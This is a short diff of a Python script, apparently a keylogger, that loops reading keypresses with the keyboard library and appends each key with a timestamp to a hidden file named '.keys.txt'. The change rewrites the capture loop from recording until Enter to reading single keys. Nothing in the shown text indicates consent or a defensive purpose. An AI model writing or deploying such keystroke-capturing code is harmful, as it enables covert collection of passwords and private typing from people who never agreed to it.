@@ -6,12 +6,12 @@ import datetime
 
 def recordKeys():
     while True:
-        event = keyboard.record('enter')
-        with open('.keys.txt', 'a') as file:
-            for e in event:
-                if e.event_type == 'down':
-                    clocktime = datetime.datetime.now().strftime("%r")
-                    file.write(f"'{e.name}'  At {clocktime}\n'")
+        key = keyboard.read_key()
+        event = keyboard.is_pressed(hotkey=key)
+        if event:
+            with open('.keys.txt', 'a') as file:
+                clocktime = datetime.datetime.now().strftime("%r")
+                file.write(f"'{key}'  At {clocktime}\n")
             
 
 
